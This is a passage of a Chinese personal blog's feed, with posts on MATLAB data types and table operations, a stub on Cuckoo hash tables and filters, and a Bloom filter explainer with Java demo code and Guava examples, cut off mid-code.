&lt;p&gt;(ps：之前一直认为Matlab没啥用&amp;amp;&amp;amp;没好好学的我对不起对不起对不起。&lt;/p&gt;
&lt;p&gt;&lt;img
src=&quot;/img/MATLAB%20-%20Wireless%20Communication%20Onramp/image-20220122214915003.png&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="MATLAB" scheme="https://lzwgiter.github.io/categories/MATLAB/"/>
    
    
    <category term="MatLab" scheme="https://lzwgiter.github.io/tags/MatLab/"/>
    
  </entry>
  
  <entry>
    <title>Matlab编程基础</title>
    <link href="https://lzwgiter.github.io/posts/3041f265.html"/>
    <id>https://lzwgiter.github.io/posts/3041f265.html</id>
    <published>2022-01-19T11:01:02.000Z</published>
    <updated>2023-01-02T16:42:56.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>学习一下使用MatLab如何进行编程，如函数、类、变量定义等，有助于实际MatLab项目的开发。</p><figure><img src="/img/Matlab编程基础/image-20220124190817431.png"alt="基本数据类型" /><figcaption aria-hidden="true">基本数据类型</figcaption></figure></blockquote><span id="more"></span><h1 id="基本数据类型">基本数据类型</h1><p>不管啥子编程语言，咱先了解人家的基本数据类型：</p><figure><img src="/img/Matlab编程基础/image-20220124190817431.png"alt="基本数据类型" /><figcaption aria-hidden="true">基本数据类型</figcaption></figure><p>从上图中可以看到有如下的数据类型：</p><ul><li><p>数字型：int8<sub>int64、uint8</sub>uint64、single、double</p></li><li><p>布尔型</p></li><li><p>集合型</p></li><li><p>文本型：string、char、cell</p></li><li><p>异构(Heterogeneous)型：timetable、structure、table、cell</p></li><li><p>函数型</p></li><li><p>时间型：datetime、duration、calendarDuration</p></li></ul><p>其中，对于保存了同一种类型数据的数组我们称为同构(homogeneous)数据、反之为异构(heterogeneous)数据。这里着重说一下<code>table</code>、<code>structure</code>、<code>cell</code>三个数据结构。<code>table</code>和数据库里的表是一样的，同列数据类型相同，如下图所示：</p><p><img src="/img/Matlab编程基础/image-20220124221353034.png" /></p><p><code>cell</code>与<code>table</code>类似，但是没有限制每一列数据类型相同，即每一个单元的数据类型都可以不同，可以理解为一个没有指定单元类型的数组。</p><p><img src="/img/Matlab编程基础/image-20220124221540851.png" /></p><p><code>structure</code>更好理解，就是包含了多种数据类型、用以描述一个具体的数据类型的数据结构，和C语言是一样的，和Java的类差不多。</p><p><img src="/img/Matlab编程基础/image-20220124221642251.png" /></p><h2 id="文本型数据常用函数">文本型数据常用函数</h2><ol type="1"><li><p>contains</p></li><li><p>erase</p></li><li><p>字符连接</p></li><li><p>replace</p></li></ol><h2 id="表型数据常用函数">表型数据常用函数</h2><ol type="1"><li>创建一个表</li></ol><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 直接创建，列名是变量名</span></span><br><span class="line">tb1 = <span class="built_in">table</span>(var1, var2, ...);</span><br><span class="line"><span class="comment">% 创建同时指定列名</span></span><br><span class="line">tb2 = <span class="built_in">table</span>(var1, var2, <span class="string">&#x27;VariableNames&#x27;</span>, [<span class="string">&#x27;Thought1&#x27;</span>,<span class="string">&#x27;OnSecondThought&#x27;</span>])</span><br><span class="line"><span class="comment">% 查看表属性</span></span><br><span class="line">tb2.Properties</span><br></pre></td></tr></table></figure><ol start="2" type="1"><li>表间操作</li></ol><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 纵向(列数必须相同)、横向(行数必须相同)合并两个表</span></span><br><span class="line">[tb1; tb2]</span><br><span class="line">[tb1 tb2]</span><br><span class="line"><span class="comment">% 不同表join操作</span></span><br><span class="line">tb3 = join(tb1, tb2, <span class="string">&quot;Keys&quot;</span>, [<span class="string">&quot;Id_1&quot;</span>, <span class="string">&quot;Id_2&quot;</span>])</span><br></pre></td></tr></table></figure><ol start="3" type="1"><li>从表中获取数据</li></ol><p>如下图所示，若需要获取表中一部分数据，我们只需要通过索引、切片的方法来获取就可以了，如<code>t2 = t1(6:15, [1 5 end-1:3nd])</code>指的就是获取<code>t1</code>表中第6行到第15行中第1列、第5列、倒数后两列的内容。可以看到matlab对于这种类矩阵的计算还是肥肠方便的。</p><figure><img src="/img/Matlab编程基础/image-20220125192334259.png"alt="image-20220125192334259" /><figcaption aria-hidden="true">image-20220125192334259</figcaption></figure><p>我们看一个例子，比如我们要获取下表中所有关于丰田的汽车信息：</p><figure><img src="/img/Matlab编程基础/image-20220125194253605.png"alt="image-20220125194253605" /><figcaption aria-hidden="true">image-20220125194253605</figcaption></figure><p>我们可以这样：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 先获取第一列的所有数据，使用contains获取索引向量</span></span><br><span class="line">Idx = contains(fleet.Make, <span class="string">&quot;Toyota&quot;</span>)</span><br><span class="line">fleet(Idx, :)</span><br></pre></td></tr></table></figure><figure><img src="/img/Matlab编程基础/image-20220125194320085.png"alt="image-20220125194320085" /><figcaption aria-hidden="true">image-20220125194320085</figcaption></figure><p>而如果说你要提取多个列的数据(不包含列名)，那么就要使用花括号了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% 提取1到3列数据</span><br><span class="line">fleet&#123;:, 1:3&#125;</span><br></pre></td></tr></table></figure><figure><img src="/img/Matlab编程基础/image-20220125200310741.png"alt="image-20220125200310741" /><figcaption aria-hidden="true">image-20220125200310741</figcaption></figure><ol start="4" type="1"><li>向表中添加新列</li></ol><p>直接赋值就可以了，新列的名字就是<code>.</code>操作符后自定义的名字：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Area = fleet.Length .* fleet.Width</span><br><span class="line">fleet.Area = Area</span><br></pre></td></tr></table></figure><h2 id="集合型数据常用函数">集合型数据常用函数</h2><p>也就是CellArray，我想叫他集合型，是因为他就是花括号一括，里面数据类型无需一致。一个集合型数据定义如下：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">car = &#123;<span class="string">&#x27;Ford&#x27;</span>,<span class="string">&#x27;Expedition&#x27;</span>;<span class="number">32.7</span>,<span class="built_in">true</span>&#125;</span><br><span class="line"><span class="comment">% 输出：</span></span><br><span class="line"><span class="comment">% 2×2 cell array</span></span><br><span class="line"><span class="comment">%</span></span><br><span class="line"><span class="comment">%    &#123;&#x27;Ford&#x27;   &#125;    &#123;&#x27;Expedition&#x27;&#125;</span></span><br><span class="line"><span class="comment">%    &#123;[32.7000]&#125;    &#123;[         1]&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;学习一下使用MatLab如何进行编程，如函数、类、变量定义等，有助于实际MatLab项目的开发。&lt;/p&gt;
&lt;figure&gt;
&lt;img src=&quot;/img/Matlab编程基础/image-20220124190817431.png&quot;
alt=&quot;基本数据类型&quot; /&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;基本数据类型&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="MatLab" scheme="https://lzwgiter.github.io/tags/MatLab/"/>
    
  </entry>
  
  <entry>
    <title>Cuckoo哈希表以及Cuckoo过滤器</title>
    <link href="https://lzwgiter.github.io/posts/854030f4.html"/>
    <id>https://lzwgiter.github.io/posts/854030f4.html</id>
    <published>2021-10-09T06:26:54.000Z</published>
    <updated>2021-11-03T09:15:52.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Cuckoo哈希表<sup>[1]</sup>(布谷鸟哈希表)是一种使用开放地址法解决哈希冲突的数据结构。上一篇学习了<em>BloomFilter</em><sup>[2]</sup>，由于普通布隆过滤器不支持删除操作，故学者提出了能够支持删除操作的<em>CountingBloomFilter</em><sup>[2]</sup>。然而计数布隆过滤器其使用的存储空间是普通布隆过滤器的3到4倍，同样支持删除操作的变体如<em>d-leftBloom Filter</em>为普通过滤器的1.5倍，而<em>QuotientFilter</em>虽然保证了空间但是却大大降低了查询的性能表现<sup>[3]</sup>。</p><p>以上问题可由Cuckoo哈希表的变体 -&gt;Cuckoo过滤器解决。原论文提供了C++版的实现以供学习：<ahref="https://github.com/efficient/cuckoofilter">cuckoofilter</a>。本篇对该过滤器及其背景(布谷鸟哈希表)进行学习。</p></blockquote><span id="more"></span><h1 id="cuckoo-hashing-table">Cuckoo Hashing Table</h1><h2 id="概念及原理">概念及原理</h2><h1 id="cuckoo-filter">Cuckoo Filter</h1><h2 id="概念及原理-1">概念及原理</h2><h1 id="参考文献">参考文献</h1><p>[1] Fan B , Andersen D G , Kaminsky M , et al. Cuckoo Filter:Practically Better Than Bloom. ACM, 2014.</p><p>[2] B. H. Bloom. Space/time trade-offs in hash coding with allowableerrors. Communications ofthe ACM, 13(7):422–426, 1970.</p><p>[3] L. Fan, P. Cao, J. Almeida, and A. Z. Broder. Summary cache: Ascalable wide-area Web cache sharing protocol. In Proc. ACMSIGCOMM,Vancouver, BC, Canada, Sept. 1998.</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Cuckoo哈希表&lt;sup&gt;[1]&lt;/sup&gt;(布谷鸟哈希表)是一种使用开放地址法解决哈希冲突的数据结构。上一篇学习了&lt;em&gt;Bloom
Filter&lt;/em&gt;&lt;sup&gt;[2]&lt;/sup&gt;，由于普通布隆过滤器不支持删除操作，故学者提出了能够支持删除操作的&lt;em&gt;Counting
Bloom
Filter&lt;/em&gt;&lt;sup&gt;[2]&lt;/sup&gt;。然而计数布隆过滤器其使用的存储空间是普通布隆过滤器的3到4倍，同样支持删除操作的变体如&lt;em&gt;d-left
Bloom Filter&lt;/em&gt;为普通过滤器的1.5倍，而&lt;em&gt;Quotient
Filter&lt;/em&gt;虽然保证了空间但是却大大降低了查询的性能表现&lt;sup&gt;[3]&lt;/sup&gt;。&lt;/p&gt;
&lt;p&gt;以上问题可由Cuckoo哈希表的变体 -&amp;gt;
Cuckoo过滤器解决。原论文提供了C++版的实现以供学习：&lt;a
href=&quot;https://github.com/efficient/cuckoofilter&quot;&gt;cuckoofilter&lt;/a&gt;。本篇对该过滤器及其背景(布谷鸟哈希表)进行学习。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="论文阅读" scheme="https://lzwgiter.github.io/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    
    
    <category term="论文阅读" scheme="https://lzwgiter.github.io/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/tags/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Bloom Filter概念原理</title>
    <link href="https://lzwgiter.github.io/posts/169c63d0.html"/>
    <id>https://lzwgiter.github.io/posts/169c63d0.html</id>
    <published>2021-10-04T03:44:55.000Z</published>
    <updated>2021-10-29T07:53:40.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>BloomFilter（布隆过滤器）是一种空间利用很高的数据结构，使用一个数据来表示一个集合，用于判断一个元素是否存在于这个集合中。但是也有妥协：在判断一个元素是否属于该集合时有可能会误判(falsepositive)，故不适合于"零错误"的场景，在能够容忍低错误率的场合下，可以通过极少的错误来换取较高的存储空间利用率。google的Guava中就有<code>BloomFilter</code>这个类。</p><p>一个比较常见的应用是缓解Redis等缓存中缓存击穿的问题。</p></blockquote><span id="more"></span><h1 id="参考学习">参考学习</h1><blockquote><p>CSDN上有两篇很不错的学习文章，一篇详细的讲解了原理，一篇给出了一个java版的简单示意demo。本文主要是对这两篇的工作进行整理、总结、补充和学习。</p></blockquote><p>原理学习：<ahref="https://blog.csdn.net/jiaomeng/article/details/1495500">(96条消息)Bloom Filter概念和原理_jiaomeng-CSDN博客_bloom filter</a></p><p>demo：<ahref="https://blog.csdn.net/qq_33709582/article/details/108407706">(96条消息)布隆过滤器原理（小白都能看懂的demo）_成都彭于晏的博客-CSDN博客</a></p><p>实用学习：<ahref="https://www.cnblogs.com/javastack/p/13292518.html">牛逼哄哄的布隆过滤器，到底有什么用？- Java技术栈 - 博客园 (cnblogs.com)</a></p><p>wiki学习：<a href="https://en.wikipedia.org/wiki/Bloom_filter">Bloomfilter - Wikipedia</a></p><h1 id="概念及原理">概念及原理</h1><p>下面是wiki对布隆过滤器的介绍：</p><blockquote><p>A Bloom filter is a space-efficient probabilistic data structure,conceived by Burton Howard Bloom in 1970, that is used to test whetheran element is a member of a set.</p><p>False positive matches are possible, but false negatives are not - inother words, a query returns either "possibly in set" or "definitely notin set".</p><p>Elements can be added to the set, but not removed(though this can beaddressed by counting Bloom filter variant); the more items added, thelarger the probability of false positives.</p></blockquote><p>怎么表示一个布隆过滤器呢？一个空的布隆过滤器是一个<em>m</em>bits的字节数组，其中所有的元素的值都为0。如下图所示：</p><p><img src="/img/Bloom-Filter概念原理/image-20211005141125182.png" alt="image-20211005141125182" style="zoom: 80%;" /></p><p>然后我们定义<em>k</em>个不同的哈希函数，每一个哈希函数都会把输入映射到上面这个<em>m</em>bits的字节数组的每一个位置中，并将该位置为1。即： <spanclass="math display">\[\begin{align}\forall x,\ Bloom[Hash_i(x)]=1,\ where\ i \in [1, k];\end{align}\]</span><strong>需要注意的是，若一个位置已经被置为1了，那么后续的元素再次映射到该位置时则仍为1。</strong>假设k=3(3个哈希函数)，我们将两个元素插入到过滤器中，结果如下图所示：</p><p><img src="/img/Bloom-Filter概念原理/image-20211005181840525.png" alt="image-20211005181840525" style="zoom:80%;" /></p><p>可以看到他们两个的哈希结果是有重叠的。</p><p>假设我们现在判断一个元素是否在集合中，道理是一样的，<strong>我们只需要对该元素进行k次哈希计算，若数组中对应下标的元素都为1，则认为该元素存在。但若有一个下标数值为0则该元素一定不存在。</strong>此外，布隆过滤器是不能删除元素的，因为你没有办法判断该数组中哪些1是该清除的，虽然你可以删除该元素的一个哈希结果位置的1(只要有一个哈希位置的结果为0则该元素不存在)，但是有可能这个操作就顺带的把其他元素也删除了。</p><p>前面提到了布隆过滤器存在假阳性(<em>falsepositive</em>)的情况，我们设f为该布隆过滤器的假阳性的可能性，p为数组中0的比例，k为哈希函数的数量，m为布隆过滤器数组的长度，n为待映射的集合元素的数量。则最佳的(f最低)选取的哈希函数的数量k为：</p><p><span class="math display">\[\begin{align}k\ =\ \frac{n}{m}ln2,\ 此时p=\frac{1}{2},\ 即布隆数组中0,1对半开\end{align}\]</span></p><p>从这个结果中我们可以看出，要让布隆过滤器错误率较低，最好让该数组还有一半空着。且我们的哈希函数的数量至少是(n/m)的ln2倍。</p><p>同时，若要让错误率<span class="math inline">\(f\ \le\epsilon\)</span>，则m应至少取到下值： <span class="math display">\[\begin{align}m\ \ge\ n\log_2e\ \cdot\ \log_2(1/\epsilon)\end{align}\]</span>具体的推导计算过程可以去看CSDN推荐文章或者看wiki，均有详细运算过程，这里只说结论。</p><h1id="布隆过滤器demo以及guava中的案例">布隆过滤器Demo以及Guava中的案例</h1><p>下面代码来自CSDN，做了部分修改，只供学习演示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.BitSet;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2021/10/06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EasyBloomFilter</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置布隆过滤器容量为100万</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_SIZE</span> <span class="operator">=</span> <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * bit数组，用来存放key</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">BitSet</span> <span class="variable">BIT_SET</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BitSet</span>(DEFAULT_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * hash函数数量k=CONSTANTS，用于hash函数计算</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span>[] CONSTANTS = &#123;<span class="number">6</span>, <span class="number">57</span>, <span class="number">99</span>, &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * add方法，计算出key的hash值，并将对应下标置为true</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key 待添加元素</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        Arrays.stream(CONSTANTS).forEach(i -&gt; BIT_SET.set(hash(key, i)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断key是否存在，true不一定说明key存在，但是false一定说明不存在</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key 待判断元素</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isContain</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : CONSTANTS) &#123;</span><br><span class="line">            <span class="comment">//短路与，只要有一个bit位为false，则返回false</span></span><br><span class="line">            <span class="keyword">if</span> (!BIT_SET.get(hash(key, i))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * hash函数，借鉴了hashmap的扰动算法，使用CONSTANTS中的常数来实现多个哈希函数的效果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> key == <span class="literal">null</span> ? <span class="number">0</span> : (i * (DEFAULT_SIZE - <span class="number">1</span>) &amp; ((h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面我们写一个测试单元来看看他的效果，我们插入100万条数据，并使用其他不存在的100万条数据来进行测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.AfterAll;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EasyBloomFilterTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">EasyBloomFilter</span> <span class="variable">FILTER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EasyBloomFilter</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加100 0000个元素进去</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test_add</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(FILTER.size());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            FILTER.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(FILTER.size());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询这100 0000个元素是否存在</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test_isContain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">results</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (FILTER.isContain(i)) &#123;</span><br><span class="line">                results += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询最终结果：共&quot;</span> + results + <span class="string">&quot;个元素存在&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询不存在的元素(100 0000 ~ 200 0000范围)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@AfterAll</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test_false_positive</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">results</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1000000</span>; i &lt; <span class="number">2000000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (FILTER.isContain(i)) &#123;</span><br><span class="line">                results += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.printf(<span class="string">&quot;1000000个不存在元素中%.0f个被判定为存在， 误判率：%f&quot;</span>, results, results/<span class="number">1000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验结果：</p><p><img src="/img/Bloom-Filter概念原理/image-20211006171959001.png" alt="image-20211006171959001"  /></p><p>可以看到在100万条错误的测试数据中，有48576个假阳性样本，误判率为0.048，这个误判率还是很理想的。</p><p>当然，也有比较官方的包支持布隆过滤器，比如Google的Guava中就有该数据结构，<strong>只不过被标记为beta。</strong>我们同样使用Guava中的布隆过滤器进行实验：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// Maven依赖：</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.google.common.hash.BloomFilter;</span><br><span class="line"><span class="keyword">import</span> com.google.common.hash.Funnels;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2021/10/06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GuavaBloomFilterTest</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预计要插入多少数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 期望的误判率</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">double</span> <span class="variable">fpp</span> <span class="operator">=</span> <span class="number">0.01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size, fpp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//插入100万条数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            bloomFilter.put(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">float</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 